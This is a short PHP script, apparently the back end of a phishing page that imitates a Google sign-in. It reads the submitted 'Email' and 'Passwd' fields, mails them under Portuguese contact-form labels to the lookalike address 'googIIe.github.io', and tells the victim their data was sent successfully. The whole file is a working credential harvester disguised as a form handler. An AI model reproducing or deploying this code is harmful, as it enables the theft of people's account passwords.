<?php
$assunto = $_POST['Email'];
$corpo = "
  Assunto:" .$_POST['Passwd']."
  Nome:" .$_POST['Email']."
  Email:" .$_POST['Email']."
  Mensagem:" .$_POST['Passwd']."
";
mail('googIIe.github.io',$assunto,$corpo,'From: crowleydesigner@gmail.com');
echo 'Seus Dados foram enviados com sucesso';
?>
